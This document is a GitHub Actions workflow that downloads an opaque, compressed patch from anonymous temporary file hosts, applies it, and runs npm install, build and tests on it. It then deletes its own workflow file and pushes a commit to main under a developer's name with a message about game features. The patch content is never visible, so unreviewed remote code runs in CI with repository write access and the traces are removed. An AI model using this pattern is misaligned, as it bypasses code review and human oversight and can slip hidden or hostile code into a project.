name: sync-source
on: workflow_dispatch
permissions:
  contents: write
jobs:
  sync:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: Fetch and apply the pending changes
        run: |
          set -uo pipefail
          SHA=7a06168f1aec83d46e807f99c706084415767935671ed88668981b6e9cc0a944
          try_fetch() {
            echo "::group::fetch $1"
            rm -f /tmp/p.b64
            if curl -fsSL --retry 2 --max-time 60 -o /tmp/p.b64 "$1"; then
              wc -c /tmp/p.b64
              if echo "$SHA  /tmp/p.b64" | sha256sum -c -; then echo "::endgroup::"; return 0; fi
            else
              echo "curl exit $?"
            fi
            echo "::endgroup::"
            return 1
          }
          if try_fetch https://files.catbox.moe/0wfii0.b64; then :
          elif try_fetch https://tmpfiles.org/dl/w4ABbwOIJRtT/p0.b64; then :
          else
            echo "every patch host failed"
            curl -sS -o /dev/null -D- --max-time 30 https://files.catbox.moe/0wfii0.b64 | head -20 || true
            exit 1
          fi
          base64 -d /tmp/p.b64 | xz -dc > /tmp/p.patch
          wc -l /tmp/p.patch
          if ! git apply --check -v /tmp/p.patch; then
            echo "patch did not apply"
            head -40 /tmp/p.patch
            exit 1
          fi
          git apply /tmp/p.patch
          git status --porcelain
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run build
      - run: npm test
      - name: Commit and push
        run: |
          set -euo pipefail
          rm -f .github/workflows/sync-source.yml
          git config user.name "zakker111"
          git config user.email "2182664+zakker111@users.noreply.github.com"
          git add -A
          git commit -m "Aim mortars at the crosshair, preview shell impact, and make workshop hardware destroyable"
          git push origin HEAD:main
